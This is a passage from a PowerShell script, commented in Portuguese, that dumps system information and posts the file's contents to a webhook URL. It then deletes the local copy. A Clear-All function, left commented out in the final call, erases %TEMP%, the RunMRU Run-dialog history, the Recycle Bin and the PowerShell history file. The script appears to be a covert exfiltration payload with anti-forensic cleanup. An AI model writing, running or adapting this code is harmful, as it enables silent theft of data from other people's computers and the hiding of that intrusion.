        if (Test-Path -Path $FilePath -PathType Leaf) {
            $resolvedPath = (Resolve-Path -Path $FilePath).ProviderPath
        } else {
            throw "Arquivo informado não existe: $FilePath"
        }
    } else {
        $candidate1 = Join-Path $env:TEMP $FilePath
        $candidate2 = Join-Path $ExportDir $FilePath

        if (Test-Path -Path $candidate1 -PathType Leaf) {
            $resolvedPath = (Resolve-Path -Path $candidate1).ProviderPath
        } elseif (Test-Path -Path $candidate2 -PathType Leaf) {
            $resolvedPath = (Resolve-Path -Path $candidate2).ProviderPath
        } else {
            throw "Arquivo '$FilePath' não encontrado em %TEMP% nem em $ExportDir."
        }
    }

    # Envia e apaga o arquivo após envio
    try {
        # Lê o conteúdo do arquivo
        $fileContent = Get-Content -Path $resolvedPath -Raw -Encoding UTF8

        # Monta a string no formato "Titulo: conteudo"
        $payloadText = "${Titulo}: ${fileContent}"

        # Converte a string montada para bytes UTF-8
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($payloadText)

        # Envia a requisição
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $bytes -ContentType 'text/plain; charset=utf-8'

        # Remove o arquivo após envio
        if (Test-Path -Path $resolvedPath) {
            Remove-Item -Path $resolvedPath -Force -ErrorAction SilentlyContinue
        }
    } catch {
        throw "Falha ao enviar para webhook '$WebhookUrl': $_"
    } finally {
        # Remove exportdir apenas se solicitado explicitamente
        try {
            if ($RemoveExportDir.IsPresent) {
                if ((Test-Path -Path $ExportDir) -and ($ExportDir.StartsWith($env:TEMP))) {
                    Remove-Item -Path $ExportDir -Recurse -Force -ErrorAction SilentlyContinue
                }
            }
        } catch {
            Write-Verbose "Falha ao remover pasta de exportação: $_"
        }
    }

    return @{ FileSent = $resolvedPath; Webhook = $WebhookUrl; Time = (Get-Date); Titulo = $Titulo }
}


######### Chama a funcao e salva o arquivo $OutFile em $ExportDir #########
function Invoke-DataDump {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [scriptblock]$DumpCommand,

        [Parameter(Mandatory = $true)]
        [string]$OutputFile,

        [Parameter(Mandatory = $false)]
        [string]$ExportDir
    )

    try {
        # Executa o comando passado via ScriptBlock
        $out = &$DumpCommand

        # Se o comando não retornar o caminho em texto, usa o OutputFile
        if ([string]::IsNullOrWhiteSpace($out)) {
            $out =$OutputFile
        }

        Write-Host "Arquivo gerado em: $out"
        return $out
    } catch {
        Write-Error "Erro ao gerar arquivo: $_"
        exit 1
    }
}


####### Enviar ao Webhook ######
function Send-DumpToWebhook {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$FilePath,

        [Parameter(Mandatory = $false)]
        [string]$WebhookUrl,

        [Parameter(Mandatory = $false)]
        [string]$Title = "Relatório de Dump",

        [Parameter(Mandatory = $false)]
        [string]$ExportDir,

        [Parameter(Mandatory = $false)]
        [switch]$RemoveExportDir
    )

    # Executa apenas se a URL do Webhook for informada
    if (-not [string]::IsNullOrWhiteSpace($WebhookUrl)) {
        try {
            Write-Host "Enviando para webhook: $WebhookUrl"

            # Monta os parâmetros dinamicamente (Splatting)
            $splatParams = @{
                FilePath   = $FilePath
                WebhookUrl = $WebhookUrl
                Titulo     = $Title
            }

            if ($ExportDir) { $splatParams['ExportDir'] =$ExportDir }
            if ($RemoveExportDir) { $splatParams['RemoveExportDir'] =$true }

            # Executa a função interna de envio
            $sendResult = send_file_to_webhook @splatParams

            # Exibe o resultado checando o retorno do objeto
            if ($null -ne $sendResult) {$fileSent = if ($sendResult.PSObject.Properties['FileSent']) {$sendResult.FileSent } else { $FilePath }$timeSent = if ($sendResult.PSObject.Properties['Time']) {$sendResult.Time } else { (Get-Date) }

                Write-Host "Envio concluído: $fileSent em$timeSent"
            } else {
                Write-Host "Envio concluído com sucesso."
            }
        } catch {
            Write-Error "Erro durante envio para webhook: $_"
        }
    }
}

  

##### Funcao de Limpeza ####
function Clear-All {
    $ea = 'SilentlyContinue'
    rm "$env:TEMP\*" -r -fo -ea $ea
    rp "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" * -ea $ea
    Clear-RecycleBin -fo -ea $ea
    rm (Get-PSReadLineOption).HistorySavePath -fo -ea $ea
    echo "Limpeza concluída!"
}

#### Executa ####
$out = Invoke-DataDump `
    -DumpCommand { Get-SystemInfo -OutputFile $OutputFileDefault -ExportDir $ExportDirDefault } `
    -OutputFile $OutputFileDefault `
    -ExportDir $ExportDirDefault

Send-DumpToWebhook `
    -FilePath $out `
    -WebhookUrl $WebhookUrl `
    -Title "System Info" `
    -ExportDir $ExportDirDefault `
    -RemoveExportDir

#Clear-All


